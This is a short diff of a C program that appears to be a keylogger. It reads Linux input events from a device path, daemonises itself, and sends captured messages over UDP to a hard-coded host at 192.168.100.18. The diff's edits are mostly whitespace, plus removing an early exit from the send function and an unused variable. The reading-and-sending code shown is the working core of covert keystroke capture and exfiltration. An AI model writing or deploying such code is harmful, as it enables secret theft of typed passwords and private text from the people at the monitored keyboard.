@@ -15,33 +15,31 @@
 
 
 void udpsend(const char *message){
+
   int port = 9800;
   const char *ip = "192.168.100.18";
-  
+
   //string ip to bytes
   struct sockaddr_in desti = {.sin_family = AF_INET, .sin_port = htons(port) };
 
   //the purpose of inet_pton is to cast the string ip to bytes input-event-codes
   if (inet_pton(AF_INET, ip, &(desti.sin_addr)) <= 0 ){     
-    perror("SOMETHING WRONG WITH IP");
-    exit(EXIT_FAILURE);
+  perror("SOMETHING WRONG WITH IP");
+  exit(EXIT_FAILURE);
   }
-
   int udp = socket(AF_INET, SOCK_DGRAM, 0);
   if (udp < 0){
     perror("CANT CREATE SOCKET");
     exit(EXIT_FAILURE);
   }
-
   if (sendto(udp, message, strlen(message) + 1, 0,
-      (struct sockaddr *)&desti, sizeof(desti)) < 0){
+    (struct sockaddr *)&desti, sizeof(desti)) < 0){
     perror("FAILED TO SEND PACKET");
     close(udp);
     exit(EXIT_FAILURE);
   }
 
   close(udp);
-  exit(EXIT_SUCCESS);
 }
 
 void daemonisasi(){
@@ -60,7 +58,6 @@ void daemonisasi(){
 
 int main(int argc, char *argv[]){
   bool CAPS = false;
-  char *event = argv[1];
 
   int fd = open(argv[1], O_RDONLY, 0);
   struct input_event ie;
